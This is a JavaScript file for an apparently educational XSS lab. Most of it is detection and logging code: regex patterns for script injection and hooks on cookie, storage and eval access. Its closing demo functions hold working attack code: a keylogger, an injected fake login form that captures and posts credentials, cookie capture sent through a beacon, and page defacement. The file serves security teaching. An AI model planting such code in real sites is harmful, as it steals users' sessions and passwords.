/**
 * XSS Playground JavaScript Utilities
 * Educational Security Laboratory - Client-side Functionality
 * 
 * This file contains JavaScript utilities for logging XSS payloads,
 * managing user interactions, and providing educational demonstrations.
 */

// Global configuration
const XSSPlayground = {
    config: {
        logEndpoint: '/log',
        maxLogEntries: 1000,
        debugMode: true,
        autoLog: true
    },
    
    stats: {
        payloadsExecuted: 0,
        reflectedTests: 0,
        storedTests: 0,
        customTests: 0
    },
    
    // Initialize the playground
    init: function() {
        this.setupEventListeners();
        this.initializeStats();
        this.setupSecurityMonitoring();
        
        if (this.config.debugMode) {
            console.log('XSS Playground initialized');
        }
    },
    
    // Set up global event listeners
    setupEventListeners: function() {
        // Listen for form submissions
        document.addEventListener('submit', this.handleFormSubmission.bind(this));
        
        // Listen for security mode changes
        document.addEventListener('change', this.handleSecurityModeChange.bind(this));
        
        // Listen for payload executions
        document.addEventListener('DOMContentLoaded', this.handlePageLoad.bind(this));
        
        // Listen for unhandled errors (potential XSS indicators)
        window.addEventListener('error', this.handleScriptError.bind(this));
        
        // Listen for CSP violations
        document.addEventListener('securitypolicyviolation', this.handleCSPViolation.bind(this));
    },
    
    // Initialize statistics tracking
    initializeStats: function() {
        // Load stats from localStorage if available
        const savedStats = localStorage.getItem('xss-playground-stats');
        if (savedStats) {
            try {
                this.stats = Object.assign(this.stats, JSON.parse(savedStats));
            } catch (e) {
                console.warn('Failed to load saved stats:', e);
            }
        }
        
        this.updateStatsDisplay();
    },
    
    // Update statistics display
    updateStatsDisplay: function() {
        const elements = {
            'reflected-count': this.stats.reflectedTests,
            'stored-count': this.stats.storedTests,
            'custom-count': this.stats.customTests,
            'log-count': this.stats.payloadsExecuted
        };
        
        Object.entries(elements).forEach(([id, value]) => {
            const element = document.getElementById(id);
            if (element) {
                element.textContent = value;
            }
        });
    },
    
    // Save statistics to localStorage
    saveStats: function() {
        try {
            localStorage.setItem('xss-playground-stats', JSON.stringify(this.stats));
        } catch (e) {
            console.warn('Failed to save stats:', e);
        }
    },
    
    // Handle form submissions
    handleFormSubmission: function(event) {
        const form = event.target;
        
        // Check if this is an XSS testing form
        if (form.action.includes('reflected') || form.action.includes('stored') || form.action.includes('custom')) {
            this.logFormSubmission(form);
        }
    },
    
    // Handle security mode changes
    handleSecurityModeChange: function(event) {
        if (event.target.name === 'mode') {
            const newMode = event.target.value;
            this.logSecurityModeChange(newMode);
            this.showSecurityModeNotification(newMode);
        }
    },
    
    // Handle page load events
    handlePageLoad: function() {
        // Check for XSS indicators in the current page
        this.scanForXSSIndicators();
        
        // Set up real-time monitoring
        this.setupRealTimeMonitoring();
    },
    
    // Handle script errors (potential XSS indicators)
    handleScriptError: function(event) {
        if (this.config.autoLog) {
            this.logXSSPayload({
                type: 'script_error',
                payload: event.message,
                source: event.filename,
                line: event.lineno,
                column: event.colno,
                url: window.location.href,
                location: 'Script Error Handler'
            });
        }
    },
    
    // Handle CSP violations
    handleCSPViolation: function(event) {
        if (this.config.autoLog) {
            this.logXSSPayload({
                type: 'csp_violation',
                payload: event.violatedDirective,
                blockedURI: event.blockedURI,
                url: window.location.href,
                location: 'CSP Violation Handler'
            });
        }
    },
    
    // Set up security monitoring
    setupSecurityMonitoring: function() {
        // Monitor for DOM modifications that might indicate XSS
        if (window.MutationObserver) {
            const observer = new MutationObserver(this.handleDOMMutation.bind(this));
            observer.observe(document.body, {
                childList: true,
                subtree: true,
                attributes: true,
                attributeFilter: ['onclick', 'onload', 'onerror', 'onmouseover']
            });
        }
        
        // Monitor for suspicious global variable access
        this.setupGlobalVariableMonitoring();
    },
    
    // Handle DOM mutations
    handleDOMMutation: function(mutations) {
        mutations.forEach(mutation => {
            if (mutation.type === 'childList') {
                mutation.addedNodes.forEach(node => {
                    if (node.nodeType === Node.ELEMENT_NODE) {
                        this.scanElementForXSS(node);
                    }
                });
            } else if (mutation.type === 'attributes') {
                if (mutation.attributeName.startsWith('on')) {
                    this.logSuspiciousAttribute(mutation.target, mutation.attributeName);
                }
            }
        });
    },
    
    // Scan element for XSS indicators
    scanElementForXSS: function(element) {
        const suspiciousPatterns = [
            /<script[^>]*>/i,
            /javascript:/i,
            /on\w+\s*=/i,
            /eval\s*\(/i,
            /document\.cookie/i,
            /window\.location/i
        ];
        
        const innerHTML = element.innerHTML;
        const outerHTML = element.outerHTML;
        
        suspiciousPatterns.forEach(pattern => {
            if (pattern.test(innerHTML) || pattern.test(outerHTML)) {
                this.logSuspiciousElement(element, pattern);
            }
        });
    },
    
    // Log suspicious element
    logSuspiciousElement: function(element, pattern) {
        if (this.config.autoLog) {
            this.logXSSPayload({
                type: 'suspicious_element',
                payload: element.outerHTML.substring(0, 500),
                pattern: pattern.toString(),
                tagName: element.tagName,
                url: window.location.href,
                location: 'DOM Scanner'
            });
        }
    },
    
    // Log suspicious attribute
    logSuspiciousAttribute: function(element, attributeName) {
        if (this.config.autoLog) {
            this.logXSSPayload({
                type: 'suspicious_attribute',
                payload: element.getAttribute(attributeName),
                attribute: attributeName,
                tagName: element.tagName,
                url: window.location.href,
                location: 'Attribute Monitor'
            });
        }
    },
    
    // Set up global variable monitoring
    setupGlobalVariableMonitoring: function() {
        // Monitor document.cookie access
        this.monitorProperty(document, 'cookie', 'document.cookie');
        
        // Monitor localStorage access
        if (window.localStorage) {
            this.monitorStorageAccess('localStorage');
        }
        
        // Monitor sessionStorage access
        if (window.sessionStorage) {
            this.monitorStorageAccess('sessionStorage');
        }
    },
    
    // Monitor property access
    monitorProperty: function(obj, prop, name) {
        const originalDescriptor = Object.getOwnPropertyDescriptor(obj, prop);
        if (!originalDescriptor) return;
        
        const playground = this;
        Object.defineProperty(obj, prop, {
            get: function() {
                playground.logPropertyAccess(name, 'get');
                return originalDescriptor.get ? originalDescriptor.get.call(this) : originalDescriptor.value;
            },
            set: function(value) {
                playground.logPropertyAccess(name, 'set', value);
                if (originalDescriptor.set) {
                    originalDescriptor.set.call(this, value);
                } else {
                    originalDescriptor.value = value;
                }
            }
        });
    },
    
    // Monitor storage access
    monitorStorageAccess: function(storageType) {
        const storage = window[storageType];
        const originalGetItem = storage.getItem;
        const originalSetItem = storage.setItem;
        const playground = this;
        
        storage.getItem = function(key) {
            playground.logStorageAccess(storageType, 'getItem', key);
            return originalGetItem.call(this, key);
        };
        
        storage.setItem = function(key, value) {
            playground.logStorageAccess(storageType, 'setItem', key, value);
            return originalSetItem.call(this, key, value);
        };
    },
    
    // Log property access
    logPropertyAccess: function(property, action, value) {
        if (this.config.autoLog) {
            this.logXSSPayload({
                type: 'property_access',
                payload: property,
                action: action,
                value: value ? value.substring(0, 200) : undefined,
                url: window.location.href,
                location: 'Property Monitor'
            });
        }
    },
    
    // Log storage access
    logStorageAccess: function(storageType, method, key, value) {
        if (this.config.autoLog) {
            this.logXSSPayload({
                type: 'storage_access',
                payload: `${storageType}.${method}`,
                key: key,
                value: value ? value.substring(0, 200) : undefined,
                url: window.location.href,
                location: 'Storage Monitor'
            });
        }
    },
    
    // Set up real-time monitoring
    setupRealTimeMonitoring: function() {
        // Monitor for new script tags
        const originalCreateElement = document.createElement;
        const playground = this;
        
        document.createElement = function(tagName) {
            const element = originalCreateElement.call(this, tagName);
            
            if (tagName.toLowerCase() === 'script') {
                playground.logDynamicScriptCreation(element);
            }
            
            return element;
        };
        
        // Monitor for eval usage
        const originalEval = window.eval;
        window.eval = function(code) {
            playground.logEvalUsage(code);
            return originalEval.call(this, code);
        };
    },
    
    // Log dynamic script creation
    logDynamicScriptCreation: function(scriptElement) {
        if (this.config.autoLog) {
            this.logXSSPayload({
                type: 'dynamic_script',
                payload: 'Script element created dynamically',
                url: window.location.href,
                location: 'Dynamic Script Monitor'
            });
        }
    },
    
    // Log eval usage
    logEvalUsage: function(code) {
        if (this.config.autoLog) {
            this.logXSSPayload({
                type: 'eval_usage',
                payload: code.substring(0, 500),
                url: window.location.href,
                location: 'Eval Monitor'
            });
        }
    },
    
    // Scan for XSS indicators on current page
    scanForXSSIndicators: function() {
        const bodyHTML = document.body.innerHTML;
        const suspiciousPatterns = [
            /<script[^>]*>.*?<\/script>/gi,
            /on\w+\s*=\s*["'].*?["']/gi,
            /javascript:[^"'\s]+/gi,
            /data:text\/html[^"'\s]*/gi
        ];
        
        suspiciousPatterns.forEach(pattern => {
            const matches = bodyHTML.match(pattern);
            if (matches) {
                matches.forEach(match => {
                    this.logDetectedXSS(match, pattern);
                });
            }
        });
    },
    
    // Log detected XSS
    logDetectedXSS: function(match, pattern) {
        if (this.config.autoLog) {
            this.logXSSPayload({
                type: 'detected_xss',
                payload: match,
                pattern: pattern.toString(),
                url: window.location.href,
                location: 'Page Scanner'
            });
        }
    },
    
    // Log form submission
    logFormSubmission: function(form) {
        const formData = new FormData(form);
        const data = {};
        
        for (let [key, value] of formData.entries()) {
            data[key] = value;
        }
        
        this.logXSSPayload({
            type: 'form_submission',
            payload: JSON.stringify(data),
            action: form.action,
            method: form.method,
            url: window.location.href,
            location: 'Form Handler'
        });
        
        // Update stats based on form action
        if (form.action.includes('reflected')) {
            this.stats.reflectedTests++;
        } else if (form.action.includes('stored')) {
            this.stats.storedTests++;
        } else if (form.action.includes('custom')) {
            this.stats.customTests++;
        }
        
        this.saveStats();
        this.updateStatsDisplay();
    },
    
    // Log security mode change
    logSecurityModeChange: function(newMode) {
        this.logXSSPayload({
            type: 'security_mode_change',
            payload: newMode,
            url: window.location.href,
            location: 'Security Mode Toggle'
        });
    },
    
    // Show security mode notification
    showSecurityModeNotification: function(mode) {
        const notification = document.createElement('div');
        notification.className = `alert alert-${mode === 'secure' ? 'success' : 'danger'} position-fixed`;
        notification.style.cssText = 'top: 20px; right: 20px; z-index: 9999; min-width: 300px;';
        notification.innerHTML = `
            <i class="fas fa-${mode === 'secure' ? 'shield-alt' : 'exclamation-triangle'} me-2"></i>
            Security mode changed to: <strong>${mode.toUpperCase()}</strong>
            <button type="button" class="btn-close ms-auto" onclick="this.parentElement.remove()"></button>
        `;
        
        document.body.appendChild(notification);
        
        // Auto-remove after 3 seconds
        setTimeout(() => {
            if (document.body.contains(notification)) {
                document.body.removeChild(notification);
            }
        }, 3000);
    }
};

/**
 * Main XSS payload logging function
 * Sends payload data to the server for logging and analysis
 */
function logXSSPayload(payloadData) {
    // Increment payload counter
    XSSPlayground.stats.payloadsExecuted++;
    XSSPlayground.saveStats();
    XSSPlayground.updateStatsDisplay();
    
    // Prepare payload data with additional context
    const logData = {
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        cookies: document.cookie,
        referrer: document.referrer,
        ...payloadData
    };
    
    // Send to server via fetch
    fetch(XSSPlayground.config.logEndpoint, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(logData)
    }).then(response => {
        if (XSSPlayground.config.debugMode) {
            console.log('Payload logged:', response.status === 200 ? 'Success' : 'Failed');
        }
    }).catch(error => {
        if (XSSPlayground.config.debugMode) {
            console.error('Failed to log payload:', error);
        }
    });
    
    // Also try image beacon as fallback
    const img = new Image();
    img.src = XSSPlayground.config.logEndpoint + '?' + 
              'type=' + encodeURIComponent(payloadData.type || 'unknown') +
              '&payload=' + encodeURIComponent(payloadData.payload || '').substring(0, 500) +
              '&url=' + encodeURIComponent(window.location.href);
}

/**
 * Utility functions for XSS demonstration
 */

// Simulate cookie theft
function demonstrateCookieTheft() {
    const cookies = document.cookie || 'No cookies found';
    alert('Simulated Cookie Theft:\n' + cookies);
    
    logXSSPayload({
        type: 'cookie_theft_demo',
        payload: 'document.cookie access',
        cookies: cookies,
        url: window.location.href,
        location: 'Cookie Theft Demo'
    });
}

// Simulate keylogger
function installKeylogger() {
    if (window.keyloggerInstalled) {
        alert('Keylogger is already installed!');
        return;
    }
    
    window.keyloggerInstalled = true;
    let keystrokes = '';
    
    document.addEventListener('keypress', function(e) {
        keystrokes += e.key;
        
        logXSSPayload({
            type: 'keylogger',
            payload: 'Key pressed: ' + e.key,
            keystroke: e.key,
            url: window.location.href,
            location: 'Keylogger Demo'
        });
        
        // Log every 10 keystrokes
        if (keystrokes.length % 10 === 0) {
            console.log('Keylogger captured:', keystrokes.substring(-10));
        }
    });
    
    alert('Keylogger installed! Check console and logs for captured keystrokes.');
}

// Simulate phishing form injection
function injectPhishingForm() {
    const phishingForm = document.createElement('div');
    phishingForm.innerHTML = `
        <div style="position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); 
                    background: white; color: black; padding: 20px; border: 3px solid red; 
                    z-index: 9999; box-shadow: 0 0 20px rgba(0,0,0,0.5);">
            <h3 style="color: red;">🚨 Security Alert 🚨</h3>
            <p>Your session has expired. Please re-enter your credentials:</p>
            <form onsubmit="handlePhishingSubmit(event)">
                <div style="margin: 10px 0;">
                    <label>Username: <input type="text" name="username" required></label>
                </div>
                <div style="margin: 10px 0;">
                    <label>Password: <input type="password" name="password" required></label>
                </div>
                <div style="margin: 10px 0;">
                    <button type="submit">Login</button>
                    <button type="button" onclick="removePhishingForm()">Cancel</button>
                </div>
            </form>
        </div>
    `;
    
    phishingForm.id = 'phishing-form';
    document.body.appendChild(phishingForm);
    
    logXSSPayload({
        type: 'phishing_form_injection',
        payload: 'Fake login form injected',
        url: window.location.href,
        location: 'Phishing Demo'
    });
}

// Handle phishing form submission
function handlePhishingSubmit(event) {
    event.preventDefault();
    const formData = new FormData(event.target);
    const credentials = {
        username: formData.get('username'),
        password: formData.get('password')
    };
    
    alert(`Credentials stolen!\nUsername: ${credentials.username}\nPassword: ${credentials.password}`);
    
    logXSSPayload({
        type: 'credentials_stolen',
        payload: JSON.stringify(credentials),
        url: window.location.href,
        location: 'Phishing Form'
    });
    
    removePhishingForm();
}

// Remove phishing form
function removePhishingForm() {
    const form = document.getElementById('phishing-form');
    if (form) {
        document.body.removeChild(form);
    }
}

// Simulate page defacement
function defacePage() {
    const originalTitle = document.title;
    const originalBody = document.body.innerHTML;
    
    // Store original content
    window.originalContent = {
        title: originalTitle,
        body: originalBody
    };
    
    // Deface the page
    document.title = '🏴‍☠️ HACKED BY XSS 🏴‍☠️';
    document.body.innerHTML = `
        <div style="background: black; color: red; text-align: center; padding: 50px; font-size: 24px;">
            <h1>🏴‍☠️ WEBSITE DEFACED 🏴‍☠️</h1>
            <p>This demonstrates how XSS can be used to deface websites</p>
            <p style="font-size: 16px; color: white;">
                This is a demonstration in a controlled environment.<br>
                In reality, this would be a serious security breach.
            </p>
            <button onclick="restorePage()" style="padding: 10px 20px; font-size: 16px; margin-top: 20px;">
                Restore Original Content
            </button>
        </div>
    `;
    
    logXSSPayload({
        type: 'page_defacement',
        payload: 'Page content replaced',
        url: window.location.href,
        location: 'Defacement Demo'
    });
}

// Restore original page content
function restorePage() {
    if (window.originalContent) {
        document.title = window.originalContent.title;
        document.body.innerHTML = window.originalContent.body;
        
        // Re-initialize the playground
        XSSPlayground.init();
        
        alert('Original page content restored!');
    }
}

// Initialize XSS Playground when DOM is loaded
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', function() {
        XSSPlayground.init();
    });
} else {
    XSSPlayground.init();
}

// Export for global access
window.XSSPlayground = XSSPlayground;
window.logXSSPayload = logXSSPayload;

// Educational console messages
if (XSSPlayground.config.debugMode) {
    console.log('%c🛡️ XSS Playground Educational Lab 🛡️', 'color: #ffc107; font-size: 16px; font-weight: bold;');
    console.log('%cThis is an educational environment for learning about XSS vulnerabilities.', 'color: #17a2b8;');
    console.log('%cUse these techniques responsibly and only on systems you own!', 'color: #dc3545; font-weight: bold;');
    console.log('%cAvailable functions:', 'color: #28a745;');
    console.log('- logXSSPayload(data): Log XSS payload execution');
    console.log('- demonstrateCookieTheft(): Show cookie theft simulation');
    console.log('- installKeylogger(): Install keylogger for demonstration');
    console.log('- injectPhishingForm(): Inject fake login form');
    console.log('- defacePage(): Demonstrate page defacement');
}
